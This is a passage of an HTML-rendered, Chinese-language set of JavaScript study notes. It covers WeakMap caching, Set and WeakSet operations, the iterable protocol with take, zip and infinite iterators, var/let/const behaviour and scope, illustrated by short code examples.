class="code"><pre><span class="line"><span class="keyword">const</span> cache = <span class="keyword">new</span> <span class="title class_">WeakMap</span>();</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">countOwnKeys</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (cache.<span class="title function_">has</span>(obj)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Cached&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> cache.<span class="title function_">get</span>(obj);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Computed&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> count = <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj).<span class="property">length</span>;</span><br><span class="line">        cache.<span class="title function_">set</span>(obj, count);</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj); <span class="comment">// &#123; a: 1, b: 2 &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">countOwnKeys</span>(obj)); <span class="comment">// Computed  2</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">countOwnKeys</span>(obj)); <span class="comment">// Cached  2</span></span><br></pre></td></tr></table></figure></div></div></div>

<h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><ul>
<li>ES6新增Set容器，可以正确处理NaN，是iterable、unordered</li>
<li>Set没有map()和filter()方法，可以把它转换成Array处理后再转换回来</li>
<li>WeakSet不允许iteration、looping和clearing</li>
</ul>
<div class="tabs" id="jsobjectset"><ul class="nav-tabs"><li class="tab active"><a href="#jsobjectset-1">Basic</a></li><li class="tab"><a href="#jsobjectset-2">Array</a></li><li class="tab"><a href="#jsobjectset-3">MapAndFilter</a></li><li class="tab"><a href="#jsobjectset-4">WeakSet</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsobjectset-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> s = <span class="keyword">new</span> <span class="title class_">Set</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="title function_">add</span>(<span class="string">&#x27;a&#x27;</span>).<span class="title function_">add</span>(<span class="string">&#x27;b&#x27;</span>)); <span class="comment">// Set &#123; &#x27;a&#x27;, &#x27;b&#x27; &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="property">size</span>); <span class="comment">// 2</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> s)   <span class="comment">// (iterable)</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);  <span class="comment">// a  b</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="title function_">has</span>(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s.<span class="title function_">delete</span>(<span class="string">&#x27;a&#x27;</span>)); <span class="comment">// true</span></span><br><span class="line">s.<span class="title function_">clear</span>(); <span class="comment">// (del all element)</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectset-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// FromArray</span></span><br><span class="line"><span class="keyword">const</span> s1 = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s1); <span class="comment">// Set &#123; &#x27;a&#x27;, &#x27;b&#x27; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ToArray</span></span><br><span class="line"><span class="keyword">const</span> a1 = <span class="title class_">Array</span>.<span class="title function_">from</span>(s1);</span><br><span class="line"><span class="keyword">const</span> a2 = [...s1]; <span class="comment">// (spread operator works with iterables)</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a1); <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a2); <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27; ]</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectset-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Mapping</span></span><br><span class="line"><span class="keyword">let</span> s2 = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line">s2 = <span class="keyword">new</span> <span class="title class_">Set</span>([...s2].<span class="title function_">map</span>(<span class="function"><span class="params">x</span> =&gt;</span> x * <span class="number">2</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s2); <span class="comment">// Set &#123; 2, 4, 6 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Filter</span></span><br><span class="line"><span class="keyword">let</span> s3 = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]);</span><br><span class="line">s3 = <span class="keyword">new</span> <span class="title class_">Set</span>([...s3].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> (x % <span class="number">2</span>) == <span class="number">0</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(s3); <span class="comment">// Set &#123; 2, 4 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Union</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">const</span> union = <span class="keyword">new</span> <span class="title class_">Set</span>([...a, ...b]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(union); <span class="comment">// Set &#123; 1, 2, 3, 4 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Intersection</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">const</span> intersection = <span class="keyword">new</span> <span class="title class_">Set</span>([...a].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> b.<span class="title function_">has</span>(x)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(intersection); <span class="comment">// Set &#123; 2, 3 &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Difference</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title class_">Set</span>([<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">const</span> difference = <span class="keyword">new</span> <span class="title class_">Set</span>([...a].<span class="title function_">filter</span>(<span class="function"><span class="params">x</span> =&gt;</span> !b.<span class="title function_">has</span>(x)));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(difference); <span class="comment">// Set &#123; 1 &#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectset-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> foos = <span class="keyword">new</span> <span class="title class_">WeakSet</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">//foos.add(this);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">method</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!foos.<span class="title function_">has</span>(<span class="variable language_">this</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeError</span>(<span class="string">&#x27;Incompatible object!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>().<span class="title function_">method</span>(); <span class="comment">// TypeError: Incompatible object!</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="其他数据结构"><a href="#其他数据结构" class="headerlink" title="其他数据结构"></a>其他数据结构</h2><h3 id="Iterable"><a href="#Iterable" class="headerlink" title="Iterable"></a>Iterable</h3><ul>
<li>ES6引入的一种遍历数据的新机制：iteration</li>
<li>适用的值：<ul>
<li>可迭代：String、Array、Map、Set、DOM-data</li>
<li>不可迭代：普通的字面对象（Plain object, as created by object literals），例如 <code>for (const x of &#123;1: &#39;a&#39;&#125;) // TypeError</code><ul>
<li>对象的属性（property）默认不可以迭代</li>
</ul>
</li>
</ul>
</li>
<li>基于Iterable访问数据的语言结构：<ul>
<li>解构分配（destructuring）：<code>const [a,b] = new Set([&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]);</code></li>
<li>for-of循环: <code>for (const x of [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]) &#123; console.log(x); &#125;</code></li>
<li>Array.from()方法: <code>const arr = Array.from(new Set([&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]));</code></li>
<li>传播语法 (…): <code>const arr = [...new Set([&#39;a&#39;, &#39;b&#39;, &#39;c&#39;])];</code></li>
<li>Map和Set的构造器<code>: </code>const set &#x3D; new Set([‘a’, ‘b’, ‘c’]);&#96;</li>
<li>Promise.all()和Promise.race()方法: <code>Promise.all(iterableOverPromises).then(···);</code></li>
<li>生成器语句(<code>yield*</code>): <code>function* yieldAllValuesOf(iterable) &#123; yield* iterable; &#125;</code></li>
</ul>
</li>
<li>ES6主要的数据结构Array, Map, Set有三个方法会返回iterable对象：<ul>
<li>entries()</li>
<li>keys()</li>
<li>values()</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><img data-src="/images/JavaScript/es6-iterable.jpg" class="" width="350" height="126" title="ES6 Iterable Define"></td>
<td align="center"><img data-src="/images/JavaScript/es6-iteration-protocol.png" class="" width="400" height="93" title="ES6 Iterable Protocol"></td>
</tr>
</tbody></table>
<div class="tabs" id="jsobjectiterable"><ul class="nav-tabs"><li class="tab active"><a href="#jsobjectiterable-1">TypeScriptDefine</a></li><li class="tab"><a href="#jsobjectiterable-2">Symbol.iterator</a></li><li class="tab"><a href="#jsobjectiterable-3">IterateOverProperties</a></li><li class="tab"><a href="#jsobjectiterable-4">CombinatorForIterables</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsobjectiterable-1"><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Iterable</span> &#123;</span><br><span class="line">    [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() : <span class="title class_">Iterator</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line">    <span class="title function_">next</span>() : <span class="title class_">IteratorResult</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IteratorResult</span> &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="built_in">any</span>;</span><br><span class="line">    <span class="attr">done</span>: <span class="built_in">boolean</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectiterable-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> iter = arr[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iter.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;a&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iter.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;b&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iter.<span class="title function_">next</span>()); <span class="comment">// &#123; value: &#x27;c&#x27;, done: false &#125;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(iter.<span class="title function_">next</span>()); <span class="comment">// &#123; value: undefined, done: true &#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectiterable-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">objectEntries</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// In ES6, you can use strings or symbols as property keys,</span></span><br><span class="line">    <span class="comment">// Reflect.ownKeys() retrieves both</span></span><br><span class="line">    <span class="keyword">const</span> propKeys = <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(obj);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (index &lt; propKeys.<span class="property">length</span>) &#123;</span><br><span class="line">                <span class="keyword">const</span> key = propKeys[index];</span><br><span class="line">                index++;</span><br><span class="line">                <span class="keyword">return</span> &#123; <span class="attr">value</span>: [key, obj[key]] &#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;<span class="number">1</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;b&#x27;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> obj) &#123; <span class="comment">// TypeError: obj is not iterable</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> [k, v] <span class="keyword">of</span> <span class="title function_">objectEntries</span>(obj)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;k&#125;</span>: <span class="subst">$&#123;v&#125;</span>`</span>); <span class="comment">// 1: a  2: b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsobjectiterable-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// returns an iterable over the first n items of iterable</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">take</span>(<span class="params">n, iterable</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> iter = iterable[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]();</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                n--;</span><br><span class="line">                <span class="keyword">return</span> iter.<span class="title function_">next</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> <span class="title function_">take</span>(<span class="number">2</span>, arr)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// a  b</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// zip turns n iterables into an iterable of n-tuples (encoded as Arrays of length n).</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">zip</span>(<span class="params">...iterables</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> iterators = iterables.<span class="title function_">map</span>(<span class="function"><span class="params">i</span> =&gt;</span> i[<span class="title class_">Symbol</span>.<span class="property">iterator</span>]());</span><br><span class="line">    <span class="keyword">let</span> done = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">                <span class="keyword">const</span> items = iterators.<span class="title function_">map</span>(<span class="function"><span class="params">i</span> =&gt;</span> i.<span class="title function_">next</span>());</span><br><span class="line">                done = items.<span class="title function_">some</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">done</span>);</span><br><span class="line">                <span class="keyword">if</span> (!done) &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123; <span class="attr">value</span>: items.<span class="title function_">map</span>(<span class="function"><span class="params">i</span> =&gt;</span> i.<span class="property">value</span>) &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Done for the first time: close all iterators</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">const</span> iterator <span class="keyword">of</span> iterators) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">typeof</span> iterator.<span class="property">return</span> === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">                        iterator.<span class="keyword">return</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// We are done</span></span><br><span class="line">            <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> zipped = <span class="title function_">zip</span>([<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>], [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> zipped) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// [ &#x27;a&#x27;, &#x27;d&#x27; ]  [ &#x27;b&#x27;, &#x27;e&#x27; ]  [ &#x27;c&#x27;, &#x27;f&#x27; ]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Infinite iterables</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">naturalNumbers</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]() &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123; <span class="attr">value</span>: n++ &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> x <span class="keyword">of</span> <span class="title function_">naturalNumbers</span>()) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 0  1  2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> [a, b, c] = <span class="title function_">naturalNumbers</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c); <span class="comment">// 0 1 2</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="变量（variable）"><a href="#变量（variable）" class="headerlink" title="变量（variable）"></a>变量（variable）</h1><ul>
<li>var：<code>non-strict</code>模式下的默认关键字<ul>
<li>hoisting：var声明的变量会优先创建（默认值undefined，和代码位置无关），然后才会执行代码</li>
</ul>
</li>
<li>let：ES6变量声明（支持Block作用域）</li>
<li>const：ES6常量声明，定义时必须初始化，不允许重新赋值（支持Block作用域）</li>
</ul>
<div class="tabs" id="jsvariable"><ul class="nav-tabs"><li class="tab active"><a href="#jsvariable-1">var-hoisting</a></li><li class="tab"><a href="#jsvariable-2">Reassign</a></li><li class="tab"><a href="#jsvariable-3">BlockScope</a></li><li class="tab"><a href="#jsvariable-4">var & let</a></li></ul><div class="tab-content"><div class="tab-pane active" id="jsvariable-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// undefined (note: not ReferenceError)</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsvariable-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> x; <span class="comment">// SyntaxError: Missing initializer in const declaration</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Declare variables with initial values</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Alex&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ZIP</span> = <span class="number">560089</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Reassign values</span></span><br><span class="line">name = <span class="string">&quot;Bob&quot;</span>; <span class="comment">// name value is &#x27;Bob&quot;</span></span><br><span class="line"><span class="variable constant_">ZIP</span> = <span class="number">65457</span>;  <span class="comment">// TypeError: Assignment to constant variable.</span></span><br><span class="line">age = <span class="number">78</span>;     <span class="comment">// the age value is 78</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsvariable-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> name  = <span class="string">&#x27;Alex&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">ZIP</span> = <span class="number">500067</span>;</span><br><span class="line">    <span class="keyword">var</span> age = <span class="number">25</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name); <span class="comment">// ReferenceError: name is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable constant_">ZIP</span>);  <span class="comment">// ReferenceError: ZIP is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);  <span class="comment">// 25</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="jsvariable-4"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* var不支持block作用域，会覆盖全局的定义 */</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">randomize</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (randomize) &#123;</span><br><span class="line">        <span class="keyword">var</span> x = <span class="title class_">Math</span>.<span class="title function_">random</span>(); <span class="comment">// (A) scope: whole function</span></span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x; <span class="comment">// accesses the x from line A</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func</span>(<span class="literal">false</span>)); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* let支持block作用域，语义更合理 */</span></span><br><span class="line"><span class="keyword">let</span> x = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func</span>(<span class="params">randomize</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (randomize) &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func</span>(<span class="literal">false</span>)); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h1><ul>
<li>Global：在所有函数的外面声明的变量<ul>
<li>Module：<code>module</code>模式下运行的代码作用域</li>
</ul>
</li>
<li>Function：在函数内部声明的本地（local）变量</li>
<li>Block：<code>&#123;&#125;</code>包围的代码（只适用ES6中<code>let/const</code>声明的变量）</li>
</ul>
<div class="tabs" id="js-scope"><ul class="nav-tabs"><li class="tab active"><a href="#js-scope-1">global vs function</a></li><li class="tab"><a href="#js-scope-2">block</a></li><li class="tab"><a href="#js-scope-3">shadowing</a></li></ul><div class="tab-content"><div class="tab-pane active" id="js-scope-1"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> global_variable = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> local_variable = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">var</span> nested_func_1 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(local_variable); <span class="comment">// 30</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> nested_func_2 = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(global_variable); <span class="comment">// 20</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">nested_func_1</span>();</span><br><span class="line">    <span class="title function_">nested_func_2</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">main_func</span>();</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="js-scope-2"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// ReferenceError: a is not defined</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="js-scope-3"><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> b = <span class="number">20</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 10 (shadowing)</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 20 (shadowing)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 